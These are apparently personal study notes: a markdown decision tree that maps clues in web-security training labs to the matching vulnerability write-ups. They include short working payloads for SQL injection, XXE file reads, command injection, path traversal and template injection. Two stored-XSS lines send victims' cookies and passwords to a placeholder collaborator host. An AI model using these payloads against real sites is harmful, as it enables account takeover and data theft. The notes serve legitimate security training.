
## Shop 🛍️
### Authenticated Shop
#### Add to Cart 🛒
##### Change Email
- Coupon field 
	- [Business logic vulnerabilities](Business%20logic%20vulnerabilities.md#1%2F2.1.Lab%20Excessive%20trust%20in%20client-side%20controls%20%E2%AD%95%EF%B8%8F)
	- [Business logic vulnerabilities](Business%20logic%20vulnerabilities.md#x.2.%20Lab%20High-level%20logic%20vulnerability%20%E2%AD%95%EF%B8%8F)
	- [Business logic vulnerabilities](Business%20logic%20vulnerabilities.md#x.8.%20Lab%20Insufficient%20workflow%20validation%20%E2%AD%95%EF%B8%8F)
	- `PROMO20` promo code
		- [Race conditions](Race%20conditions.md#x.1.%20Lab%20Limit%20overrun%20race%20conditions%20%E2%AD%95%EF%B8%8F)
	- `NEWCUST5` promo code
		- [Business logic vulnerabilities](Business%20logic%20vulnerabilities.md#x.4.Lab%20Flawed%20enforcement%20of%20business%20rules%20%E2%AD%95%EF%B8%8F)
	- Change email > "Please click the link in your email to confirm the change of e-mail..."
		- [Race conditions](Race%20conditions.md#2.4.%20Lab%20Single-endpoint%20race%20conditions%20%E2%AD%95%EF%B8%8F)
- Checkout > `chosen_discount` in `GET /api/checkout`
	- [API Testing](API%20Testing.md#2.4.%20Lab%20Exploiting%20a%20mass%20assignment%20vulnerability%20%E2%AD%95%EF%B8%8F)


#### Check stock ❌
- `GET /` 
	- `Host: www.hacker.com`
		- "Client Error: Forbidden"
			- [SSRF](SSRF.md#1.x.%20Lab%20SSRF%20via%20flawed%20request%20parsing%20%E2%AD%95%EF%B8%8F)

##### Comment in Page Source
- `CustomTemplate.php`
	- [Deserialization](Deserialization.md#3.4.%20Lab%20Arbitrary%20object%20injection%20in%20PHP%20%E2%AD%95%EF%B8%8F)
- `/admin-*******`
	- [Access Control](Access%20Control.md#2.2.%20Lab%20Unprotected%20admin%20functionality%20with%20unpredictable%20URL%20%E2%AD%95%EF%B8%8F)

##### `/.git`
- [Content Discovery](Content%20Discovery.md#1.5.%20Lab%20Information%20disclosure%20in%20version%20control%20history%20%E2%AD%95%EF%B8%8F)

##### `/robots.txt`
- `Disallow: /administrator-panel`
	- [Access Control](Access%20Control.md#2.1.%20Lab%20Unprotected%20admin%20functionality%20%E2%AD%95%EF%B8%8F)

##### `/admin`
- Register button
	- "Admin interface only available if logged in as a DontWannaCry user"
		- [Authentication](Authentication.md#1.x.%20Lab%20Inconsistent%20handling%20of%20exceptional%20input%20%E2%AD%95%EF%B8%8F)
		- [Business logic vulnerabilities](Business%20logic%20vulnerabilities.md#2.3.Lab%20Inconsistent%20security%20controls%20%E2%AD%95%EF%B8%8F)
- "Admin interface only available to local users"
	- [Content Discovery](Content%20Discovery.md#1.4.%20Lab%20Authentication%20bypass%20via%20information%20disclosure%20%E2%AD%95%EF%B8%8F)
	- [Host Headers](Host%20Headers.md#1.2.%20Lab%20Host%20header%20authentication%20bypass%20%E2%AD%95%EF%B8%8F)
- "Admin interface only available if logged in as an administrator"
	- Login as `wiener:peter`
		- `Admin=false` cookie
			- [Access Control](Access%20Control.md#2.3.%20Lab%20User%20role%20controlled%20by%20request%20parameter%20%E2%AD%95%EF%B8%8F)
		- `roleid` in `POST /my-account/change-email` 
			- [Access Control](Access%20Control.md#2.4.%20Lab%20User%20role%20can%20be%20modified%20in%20user%20profile%20%E2%AD%95%EF%B8%8F)

##### Login Attempt: `wiener:peter`
- "Invalid username or password."
	- `Host` to `example.com`
		- 301 Moved Permanently
			- [Host Headers](Host%20Headers.md#1.6.%20Lab%20Host%20validation%20bypass%20via%20connection%20state%20attack%20%E2%AD%95%EF%B8%8F)
		- 504 Gateway Timeout
			-  [Host Headers](Host%20Headers.md#1.4.%20Lab%20Routing-based%20SSRF%20%E2%AD%95%EF%B8%8F)
		- 421 Misdirected Request
			- `username=administrator'--`  == 302 Found
				- [SQLi](SQLi.md#2.2.%20Lab%20SQL%20injection%20vulnerability%20allowing%20login%20bypass%20%E2%AD%95%EF%B8%8F)
	- `X-Cache`
		- <sup>Param Miner: Guess headers</sup> `X-Forwarded-Host` value reflected in response
			- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.1.%20Lab%20Web%20cache%20poisoning%20with%20an%20unkeyed%20header%20%E2%AD%95%EF%B8%8F)
		- <sup>Param Miner: Guess headers</sup> `X-Forwarded-Host` + `X-Forwarded-Scheme`
			- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.3.%20Lab%20Web%20cache%20poisoning%20with%20multiple%20headers%20%E2%AD%95%EF%B8%8F)
		- `fehost` cookie reflected in response
			- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.2.%20Lab%20Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie%20%E2%AD%95%EF%B8%8F)
		- 2nd `Host` header reflected in response
			- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.x.%20Lab%20Web%20cache%20poisoning%20via%20ambiguous%20requests%20%E2%AD%95%EF%B8%8F)
	- Admin panel or `/admin` = "Access denied"
		- [Access Control](Access%20Control.md#2.10.%20Lab%20URL-based%20access%20control%20can%20be%20circumvented%20%E2%AD%95%EF%B8%8F)


##### Change Address
>Remember to add a comma `,` after the previous key:value pair
```
"__proto__": { "foo":"bar" }
```
- `"foo":"bar"` reflected in response
	- [Server side](Server%20side.md#2%206%20Lab%20Privilege%20escalation%20via%20server-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)
	- [Server side](Server%20side.md#3.9.%20Lab%20Remote%20code%20execution%20via%20server-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)
- `"foo":"bar"` *doesn't* reflect in response
	- [Server side](Server%20side.md#2.7.%20Lab%20Detecting%20server-side%20prototype%20pollution%20without%20polluted%20property%20reflection%20%E2%AD%95%EF%B8%8F)
	- [Server side](Server%20side.md#2.8.%20Lab%20Bypassing%20flawed%20input%20filters%20for%20server-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)


##### Change Email
- Decoded `session` cookie = `0:4` = PHP serialized object
	- [Deserialization](Deserialization.md#3.1.%20Lab%20Modifying%20serialized%20objects%20%E2%AD%95%EF%B8%8F)
	- [Deserialization](Deserialization.md#3.2.%20Lab%20Modifying%20serialized%20data%20types%20%E2%AD%95%EF%B8%8F)
- `session` cookie = `rO0AB` = Java serialized object
	- [Deserialization](Deserialization.md#3.5.%20Lab%20Exploiting%20Java%20deserialization%20with%20Apache%20Commons%20%E2%AD%95%EF%B8%8F)
- `session cookie`= `%7B%22token`
	- [Deserialization](Deserialization.md#3.6.%20Lab%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain%20%E2%AD%95%EF%B8%8F)
- `GET /my-account?id={USERNAME}` > Passive scan selected message > `serialized Ruby object using Marshal`
	- [Deserialization](Deserialization.md#3.7.%20Lab%20Exploiting%20Ruby%20deserialization%20using%20a%20documented%20gadget%20chain%20%E2%AD%95%EF%B8%8F)
- Creds: `content-manager:C0nt3ntM4n4g3r`
	- Product > Edit template has this syntax: `${someExpression}`
		- [SSTI](SSTI.md#3.3.%20Lab%20Server-side%20template%20injection%20using%20documentation%20%E2%AD%95%EF%B8%8F)
		- [SSTI](SSTI.md#3.5.%20Lab%20Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects%20%E2%AD%95%EF%B8%8F)
- Creds: `administrator:admin`
	- **Open private window > login as wiener then run:** `GET /admin-roles?username=wiener&action=upgrade`
		- 302 Found
			- [Access Control](Access%20Control.md#2.11.%20Lab%20Method-based%20access%20control%20can%20be%20circumvented%20%E2%AD%95%EF%B8%8F)
		- 401 Unauthorized
			- [Access Control](Access%20Control.md#2.13.%20Lab%20Referer-based%20access%20control%20%E2%AD%95%EF%B8%8F)
	- `confirmed=true` in `POST /admin-roles`
		- [Access Control](Access%20Control.md#2.12.%20Lab%20Multi-step%20process%20with%20no%20access%20control%20on%20one%20step%20%E2%AD%95%EF%B8%8F)
- `/api`
	- 200 OK
		- [API Testing](API%20Testing.md#2.1.%20Lab%20Exploiting%20an%20API%20endpoint%20using%20documentation%20%E2%AD%95%EF%B8%8F)
	- 400 Bad Request: "Query not present"
		- [GraphQL Endpoints](GraphQL%20Endpoints.md#2.3.%20Lab%20Finding%20a%20hidden%20GraphQL%20endpoint%20%E2%AD%95%EF%B8%8F)
- `GET /accountDetails`
	- `Access-Control-Allow-Credentials: true`
		- [CORS](../Stage%202/CORS.md#2.1.%20Lab%20CORS%20vulnerability%20with%20basic%20origin%20reflection%20%E2%AD%95%EF%B8%8F)
		- [CORS](../Stage%202/CORS.md#2.2.%20Lab%20CORS%20vulnerability%20with%20trusted%20null%20origin%20%E2%AD%95%EF%B8%8F)
- `/my-account?id={USERNAME}`
	- `id={USERNAME}`
		- [Access Control](Access%20Control.md#2.5.%20Lab%20User%20ID%20controlled%20by%20request%20parameter%20%E2%AD%95%EF%B8%8F)
		- [Access Control](Access%20Control.md#2.7.%20Lab%20User%20ID%20controlled%20by%20request%20parameter%20with%20data%20leakage%20in%20redirect%20%E2%AD%95%EF%B8%8F)

##### Change Password + Change Email
- Password field: `*****`
	- [Access Control](Access%20Control.md#2.8.%20Lab%20User%20ID%20controlled%20by%20request%20parameter%20with%20password%20disclosure%20%E2%AD%95%EF%B8%8F)

##### Forgot password?
- Cannot login
	- `administrator` == 200 OK
		- [API Testing](API%20Testing.md#2.2.%20Lab%20Exploiting%20server-side%20parameter%20pollution%20in%20a%20query%20string%20%E2%AD%95%EF%B8%8F)

##### Filter Categories
- `TrackingId` cookie + add `'` to it
	- 200 OK
		- "Welcome back!"
			- [Blind SQLi](Blind%20SQLi.md#2.11.%20Lab%20Blind%20SQL%20injection%20with%20conditional%20responses%20%E2%AD%95%EF%B8%8F)
		-  `'||+(SELECT+pg_sleep(10))--` == ~10sec response
			- [Blind SQLi](Blind%20SQLi.md#2.14.%20Lab%20Blind%20SQL%20injection%20with%20time%20delays%20%E2%AD%95%EF%B8%8F)
			- [Blind SQLi](Blind%20SQLi.md#2.15.%20Lab%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval%20%E2%AD%95%EF%B8%8F)
		- [Blind SQLi](Blind%20SQLi.md#2.16.%20Lab%20Blind%20SQL%20injection%20with%20out-of-band%20interaction%20%E2%AD%95%EF%B8%8F)
		- [Blind SQLi](Blind%20SQLi.md#2.17.%20Lab%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration%20%E2%AD%95%EF%B8%8F)
	- 500 Internal Server Error
		- `'--` added to the cookie == 200 OK
			- [SQLi](SQLi.md#2.13.%20Lab%20Visible%20error-based%20SQL%20injection%20%E2%AD%95%EF%B8%8F)
			- [Blind SQLi](Blind%20SQLi.md#2.12.%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%20%E2%AD%95%EF%B8%8F)
-  `'+order+by+1--`
	- 200 OK
		- `POST /login` uses `Content-Type: application/json` 
			- [NoSQL injection](NoSQL%20injection.md#2.2.%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20bypass%20authentication%20%E2%AD%95%EF%B8%8F)
			- [NoSQL injection](NoSQL%20injection.md#1%2F2.4%20Lab%20Exploiting%20NoSQL%20operator%20injection%20to%20extract%20unknown%20fields%20%E2%AD%95%EF%B8%8F)
- "Your username is: wiener (role: user)"
	- `GET /user/lookup?user=wiener`
		- [NoSQL injection](NoSQL%20injection.md#2.3.%20Lab%20Exploiting%20NoSQL%20injection%20to%20extract%20data%20%E2%AD%95%EF%B8%8F)

##### Filter Categories (No Products) <sup>Only show 2 rows of text per entry</sup>
- `'+order+by+1--`
	- 200 OK
		- `'+UNION+SELECT+'abc','def'--` == 200 OK
			- [SQLi](SQLi.md#2.5.%20Lab%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases%20%E2%AD%95%EF%B8%8F)
			- [SQLi](SQLi.md#2.9.%20Lab%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables%20%E2%AD%95%EF%B8%8F)
		- `'+UNION+SELECT+'abc','def'+FROM+dual--` == 200 OK
			- [SQLi](SQLi.md#2.6.%20Lab%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle%20%E2%AD%95%EF%B8%8F)

##### Filter Categories (No Images)
- `'+order+by+1--`
	- 200 OK
		- `'+UNION+SELECT+NULL,NULL,NULL--`
			- 200 OK 
				- [SQLi](SQLi.md#2.7.%20Lab%20SQL%20injection%20UNION%20attack%2C%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query%20%E2%AD%95%EF%B8%8F)
				- [SQLi](SQLi.md#2.8.%20Lab%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text%20%E2%AD%95%EF%B8%8F)
			- 500 Internal Server Error
				- [SQLi](SQLi.md#2.10.%20Lab%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column%20%E2%AD%95%EF%B8%8F)

##### Live Chat
- Login Attempt: `wiener:peter`
	- "Invalid username or password."
		- [CSRF](CSRF.md#2.9.%20Lab%20SameSite%20Strict%20bypass%20via%20sibling%20domain%20%E2%AD%95%EF%B8%8F)
		- Ask LLM: `what apis do you have access to?`
			- `debug_sql`
				- [Web LLM attacks](Web%20LLM%20attacks.md#1%2F2.1.%20Lab%20Exploiting%20LLM%20APIs%20with%20excessive%20agency%20%E2%AD%95%EF%B8%8F)
			- `subscribe_to_newsletter`
				- [Web LLM attacks](Web%20LLM%20attacks.md#3.2.%20Lab%20Exploiting%20vulnerabilities%20in%20LLM%20APIs%20%E2%AD%95%EF%B8%8F)
		- Register button
			- [Web LLM attacks](Web%20LLM%20attacks.md#1%2F2.3.%20Lab%20Indirect%20prompt%20injection%20%E2%AD%95%EF%B8%8F)
		- READY websocket message retrieves entire chat history + `SameSite: none`
			- [WebSockets](WebSockets.md#1.2.%20Lab%20Cross-site%20WebSocket%20hijacking%20%E2%AD%95%EF%B8%8F)
			- XSS payload (`<script>alert(1)</script>`) == `Error: Attack detected: JavaScript`
				- [WebSockets](WebSockets.md#1.3.%20Lab%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities%20%E2%AD%95%EF%B8%8F)
- View transcript button *Not sure about login attempt message*
	- `GET /download-transcript/{INTEGER}.txt`
		- [Access Control](Access%20Control.md#2.9.%20Lab%20Insecure%20direct%20object%20references%20%E2%AD%95%EF%B8%8F)

##### Please select a role
- `/admin`
	- "Admin interface only available if logged in as an administrator"
		- [Business logic vulnerabilities](Business%20logic%20vulnerabilities.md#2.9.%20Lab%20Authentication%20bypass%20via%20flawed%20state%20machine%20%E2%AD%95%EF%B8%8F)


#### Check stock ✅

##### Change Email
- `GET /accountDetails`
	- `Access-Control-Allow-Credentials: true`
		- [CORS](../Stage%202/CORS.md#2.3.%20Lab%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols%20%E2%AD%95%EF%B8%8F)

##### Login Attempt: `wiener:peter`
- "Invalid username or password."
	- `POST /product/stock` uses XML
		- [SQLi](SQLi.md#2.18.%20Lab%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding%20%E2%AD%95%EF%B8%8F)
	- `stockAPI` in `POST /product/stock`
		- [SSRF](SSRF.md#3.1.%20Lab%20Basic%20SSRF%20against%20the%20local%20server%20%E2%AD%95%EF%B8%8F)
		- [SSRF](SSRF.md#3.2.%20Lab%20Basic%20SSRF%20against%20another%20back-end%20system%20%E2%AD%95%EF%B8%8F)
		- [SSRF](SSRF.md#3.4.%20Lab%20SSRF%20with%20blacklist-based%20input%20filter%20%E2%AD%95%EF%B8%8F)
		- [SSRF](SSRF.md#3.5.%20Lab%20SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability%20%E2%AD%95%EF%B8%8F)

##### Filter + Submit Feedback + Live Chat
- `jquery_1-7-1.js`
	- [Client side](Client%20side.md#2.5.%20Lab%20Client-side%20prototype%20pollution%20in%20third-party%20libraries%20%E2%AD%95%EF%B8%8F)

##### Change Email + Gift Card
- [Authentication](Authentication.md#1.x.%20Lab%20Infinite%20money%20logic%20flaw%20%E2%AD%95%EF%B8%8F)



---
### Unauthenticated Shop
#### Check stock ❌
- `GET /image?filename=../../../etc/passwd`
	- 200 OK
		- [LFI](LFI.md#3.1.%20Lab%20File%20path%20traversal%2C%20simple%20case%20%E2%AD%95%EF%B8%8F)
	- "No such file"
		- [LFI](LFI.md#3.2.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20blocked%20with%20absolute%20path%20bypass%20%E2%AD%95%EF%B8%8F)
		- [LFI](LFI.md#3.3.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20non-recursively%20%E2%AD%95%EF%B8%8F)
		- [LFI](LFI.md#3.4.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20with%20superfluous%20URL-decode%20%E2%AD%95%EF%B8%8F)
		- [LFI](LFI.md#3.6.%20Lab%20File%20path%20traversal%2C%20validation%20of%20file%20extension%20with%20null%20byte%20bypass%20%E2%AD%95%EF%B8%8F)
	- "Missing parameter 'filename'"
		- [LFI](LFI.md#3.5.%20Lab%20File%20path%20traversal%2C%20validation%20of%20start%20of%20path%20%E2%AD%95%EF%B8%8F)
- `GET /product?productId=1` set `Referer` to Burp Collaborator
	- [SSRF](SSRF.md#3.3.%20Lab%20Blind%20SSRF%20with%20out-of-band%20detection%20%E2%AD%95%EF%B8%8F)
- `GET /?message=Unfortunately...`  after clicking on View details
	- `<%25%3d+7*7+%25>`
		- 49 in response
			- [SSTI](SSTI.md#3.1.%20Lab%20Basic%20server-side%20template%20injection%20%E2%AD%95%EF%B8%8F)
		- `7*7` in response
			- [SSTI](SSTI.md#3.4.%20Lab%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit%20%E2%AD%95%EF%B8%8F)
- `GET /product?productId=a`
	- Apache Struts 2 2.3.31
		- [Content Discovery](Content%20Discovery.md#1.1%20Lab%20Information%20disclosure%20in%20error%20messages%20%E2%AD%95%EF%B8%8F)

##### Comment in Page Source
- `phpinfo.php`
	- [Content Discovery](Content%20Discovery.md#1.2.%20Lab%20Information%20disclosure%20on%20debug%20page%20%E2%AD%95%EF%B8%8F)
- `addEventListener`
	- `JSON.parse(e.data)` 
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.3.%20Lab%20DOM%20XSS%20using%20web%20messages%20and%20%60JSON.parse%60%20%E2%AD%95%EF%B8%8F)
	- `getElementById()`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.1.%20Lab%20DOM%20XSS%20using%20web%20messages%20%E2%AD%95%EF%B8%8F)

##### Target > Engagement tools > Search
- `lastViewedProduct`
	- [DOM-Based XSS](DOM-Based%20XSS.md#1.5.%20Lab%20DOM-based%20cookie%20manipulation%20%E2%AD%95%EF%B8%8F)


##### `/robots.txt`
- `/backup`
	- [Content Discovery](Content%20Discovery.md#1.3.%20Lab%20Source%20code%20disclosure%20via%20backup%20files%20%E2%AD%95%EF%B8%8F)
	- 

##### Submit Feedback
- `||ping+-c+10+127.0.0.1||` 
	- takes ~10secs from response
		- [OS Command Injection](OS%20Command%20Injection.md#3.2.%20Lab%20Blind%20OS%20command%20injection%20with%20time%20delays%20%E2%AD%95%EF%B8%8F)
		- [OS Command Injection](OS%20Command%20Injection.md#3.3.%20Lab%20Blind%20OS%20command%20injection%20with%20output%20redirection%20%E2%AD%95%EF%B8%8F)
	- immediate response
		- [OS Command Injection](OS%20Command%20Injection.md#3.4.%20Lab%20Blind%20OS%20command%20injection%20with%20out-of-band%20interaction%20%E2%AD%95%EF%B8%8F)
		- [OS Command Injection](OS%20Command%20Injection.md#3.5.%20Lab%20Blind%20OS%20command%20injection%20with%20out-of-band%20data%20exfiltration%20%E2%AD%95%EF%B8%8F)

##### Filter Categories
- `'+order+by+1--`
	- 200 OK
		- <sup>Solve: '+OR+1=1--</sup> [SQLi](SQLi.md#2.1.%20Lab%20SQL%20injection%20vulnerability%20in%20WHERE%20clause%20allowing%20retrieval%20of%20hidden%20data%20%E2%AD%95%EF%B8%8F)
	- 500 Internal Server Error
		- JavaScript syntax error `JSInterpreterFailure`
			- [NoSQL injection](NoSQL%20injection.md#1%2F2.1.%20Lab%20Detecting%20NoSQL%20injection%20%E2%AD%95%EF%B8%8F)

##### Filter Categories (No Products) <sup>Only show 2 rows of text per entry</sup>
- `'+order+by+1--`
	- 200 OK
		- `'+UNION+SELECT+'abc','def'+FROM+dual--` == 200 OK
			- [SQLi](SQLi.md#2.3.%20Lab%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20Oracle%20%E2%AD%95%EF%B8%8F) 
	- 500 Internal Server Error
		- `'+order+by+1#` == 200 OK
			- [SQLi](SQLi.md#2.4.%20Lab%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft%20%E2%AD%95%EF%B8%8F)



#### Check stock ✅
- `|whoami` for `storeId or productId` in `POST /product/stock` = 200 OK
	- <sup>Scan result: YES</sup> [OS Command Injection](OS%20Command%20Injection.md#3.1.%20Lab%20OS%20command%20injection%2C%20simple%20case%20%E2%AD%95%EF%B8%8F)
- XML in `POST /product/stock`
```
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck><productId>&xxe;</productId>
```
- -
	- Show `/etc/passwd` content
		- <sup>Scan result: YES</sup> [XXE](XXE.md#3.1.%20Lab%20Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files%20%E2%AD%95%EF%B8%8F)
		- <sup>Scan result: YES</sup>[XXE](XXE.md#3.2.%20Lab%20Exploiting%20XXE%20to%20perform%20SSRF%20attacks%20%E2%AD%95%EF%B8%8F)
	- "Invalid product ID"
		- <sup>Scan result: YES</sup>[XXE](XXE.md#3.3.%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20%E2%AD%95%EF%B8%8F)
	- "Entities are not allowed for security reasons"
		- [XXE](XXE.md#3.4.%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities%20%E2%AD%95%EF%B8%8F)
- **No** XML in `POST /product/stock`
	- <sup>Scan result: YES</sup>[XXE](XXE.md#3.7.%20Lab%20Exploiting%20XInclude%20to%20retrieve%20files%20%E2%AD%95%EF%B8%8F)
- `storeId={CITY}` like *storeId=London*
	- `document.write('</select>');` in Page Source
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20%60document.write%60%20sink%20using%20source%20%60location.search%60%20inside%20a%20select%20element%20%E2%AD%95%EF%B8%8F)


##### Submit Feedback
- XML in `POST /product/stock`
	- *Use payload above* = "Entities are not allowed for security reasons"
		- [XXE](XXE.md#3.5.%20Lab%20Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD%20%E2%AD%95%EF%B8%8F)
		- [XXE](XXE.md#3.6.%20Lab%20Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages%20%E2%AD%95%EF%B8%8F)


##### Timer
- 10mins
	- [Essential skills](Essential%20skills.md#3.1.%20Lab%20Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning%20%E2%AD%95%EF%B8%8F)


---
---
## Blog 💻
### Authenticated Blog
#### No Comments
##### GraphQL
- "mutation"
	- [GraphQL Endpoints](GraphQL%20Endpoints.md#2.4.%20Lab%20Bypassing%20GraphQL%20brute%20force%20protections%20%E2%AD%95%EF%B8%8F)
	- [GraphQL Endpoints](GraphQL%20Endpoints.md#2.5.%20Lab%20Performing%20CSRF%20exploits%20over%20GraphQL%20%E2%AD%95%EF%B8%8F)


#### Only Comment Field in Blog
##### Change Preferred Name
- `}}{{7*7}}` on `blog-post-author-display` param in `POST` request
	- Tornado
		- [SSTI](SSTI.md#3.2.%20Lab%20Basic%20server-side%20template%20injection%20%28code%20context%29%20%E2%AD%95%EF%B8%8F)

##### Change Email + Upload Avatar + Delete account button
- [Deserialization](Deserialization.md#3.%20Lab%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization%20%E2%AD%95%EF%B8%8F)

#### Every field
##### My account
- "We are now redirecting you to login with social media..."
	- [CSRF](CSRF.md#2.10.%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%E2%AD%95%EF%B8%8F)
	- No features (no change email, etc.)
		- `POST /authenticate`
			- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.1.%20Lab%20Authentication%20bypass%20via%20OAuth%20implicit%20flow%20%E2%AD%95%EF%B8%8F)
			- "Next post" button on blogs
				- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.5.%20Lab%20Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect%20%E2%AD%95%EF%B8%8F)
		- *NO* `POST /authenticate`
			- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.2.%20Lab%20SSRF%20via%20OpenID%20dynamic%20client%20registration%20%E2%AD%95%EF%B8%8F)
			- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.4.%20Lab%20OAuth%20account%20hijacking%20via%20redirect_uri%20%E2%AD%95%EF%B8%8F)
- Login with social media button
	- Social media creds: `peter.wiener:hotdog`
		- [CSRF](CSRF.md#2.x.%20Lab%20Forced%20OAuth%20profile%20linking%20%E2%AD%95%EF%B8%8F)


##### Forgot password?
- `Host` to `example.com`
	- 200 OK
		- [Host Headers](Host%20Headers.md#1.1%20Lab%20Basic%20password%20reset%20poisoning%20%E2%AD%95%EF%B8%8F)
	- 421 Misdirected Request
		- [Host Headers](Host%20Headers.md#1.11%20Lab%20Password%20reset%20poisoning%20via%20middleware%20%E2%AD%95%EF%B8%8F)
- `username` in `POST /forgot-password`
	- [Password Reset](Password%20Reset.md#2.5.%20Lab%20Exploiting%20time-sensitive%20vulnerabilities%20%E2%AD%95%EF%B8%8F)
	- `temp-forgot-password-token`
		- [Password Reset](Password%20Reset.md#2.3.%20Lab%20Password%20reset%20broken%20logic%20%E2%AD%95%EF%B8%8F)

##### Asks for 4-digit security code
- [Authentication](Authentication.md#1.2.%20Lab%202FA%20simple%20bypass%20%E2%AD%95%EF%B8%8F)
- `verify` cookie 
	- [Authentication](Authentication.md#1.8.%20Lab%202FA%20broken%20logic%20%E2%AD%95%EF%B8%8F)

##### Login Attempt: `wiener:peter`
- "Invalid username or password."
	- [Authentication](Authentication.md#1.7.%20Lab%20Username%20enumeration%20via%20account%20lock%20%E2%AD%95%EF%B8%8F)
	- [Brute Force](Brute%20Force.md#1.4.%20Lab%20Username%20enumeration%20via%20subtly%20different%20responses%20%E2%AD%95%EF%B8%8F)
	- "HTML is allowed" in Blog + `x-host`
		- <sup>Param Miner: Guess headers</sup> [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.4.Lab%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header%20%E2%AD%95%EF%B8%8F)
	- **Post Comment**
		- `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>` and victim's cookie in collaborator
			- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%20cookies%20%E2%AD%95%EF%B8%8F)
		- `<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`
			- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords%20%E2%AD%95%EF%B8%8F)
	- **Use HTTP Request Smuggling payload**
		- 500 Internal Server Error
			- [CL](CL.md#1.3.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability%20%E2%AD%95%EF%B8%8F)
			- [Others](Others.md#1.6.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users%27%20requests%20%E2%AD%95%EF%B8%8F)
- "Invalid username"
	- [Brute Force](Brute%20Force.md#1.1%20Lab%20Username%20enumeration%20via%20different%20responses%20%E2%AD%95%EF%B8%8F)
- Admin panel or `/admin` = "Path /admin is blocked"
	- **Use HTTP Request Smuggling payload**
		- 400 Bad Request
			- [Others](Others.md#1.x.%20Lab%20CL.0%20request%20smuggling%20%E2%AD%95%EF%B8%8F)
			- [TE](TE.md#1.4.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability%20%E2%AD%95%EF%B8%8F)

##### Stay Logged In Checkbox
- [Brute Force](Brute%20Force.md#1.9.%20Lab%20Brute-forcing%20a%20stay-logged-in%20cookie%20%E2%AD%95%EF%B8%8F)
- No client-side validation for Email field
	- [Business logic vulnerabilities](Business%20logic%20vulnerabilities.md#2.10.%20Lab%20Authentication%20bypass%20via%20encryption%20oracle%20%E2%AD%95%EF%B8%8F)
- Delete account button
	- [Brute Force](Brute%20Force.md#1.10.%20Lab%20Offline%20password%20cracking%20%E2%AD%95%EF%B8%8F)

##### Change Email
- Invalid Login Attempts: `aaa:aaa`
	- "You have made too many incorrect login attempts. Please try again in X minute(s)."
		- [Authentication](Authentication.md#1.6.%20Lab%20Broken%20brute-force%20protection%2C%20IP%20block%20%E2%AD%95%EF%B8%8F)
		- [Brute Force](Brute%20Force.md#1.5.%20Lab%20Username%20enumeration%20via%20response%20timing%20%E2%AD%95%EF%B8%8F)
		- [Race conditions](Race%20conditions.md#1%2F2.2.%20Lab%20Bypassing%20rate%20limits%20via%20race%20conditions%20%E2%AD%95%EF%B8%8F)
- `/my-account?id={GUID}`
